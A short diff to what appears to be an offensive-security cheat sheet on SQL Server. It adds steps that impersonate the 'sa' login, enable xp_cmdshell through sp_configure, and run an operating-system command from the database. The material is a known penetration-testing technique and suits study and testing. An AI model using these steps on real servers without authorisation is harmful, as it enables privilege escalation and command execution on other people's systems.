@@ -303,6 +303,15 @@ EXECUTE AS LOGIN = 'dbadmin'
 EXECUTE AS LOGIN = 'sa'
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
+Execute Command from SQL Server 
+```
+EXECUTE as LOGIN = 'sa'
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell',1
+RECONFIGURE
+EXEC master..xp_cmdshell 'whoami'
+```
 
 
 ## Persistence
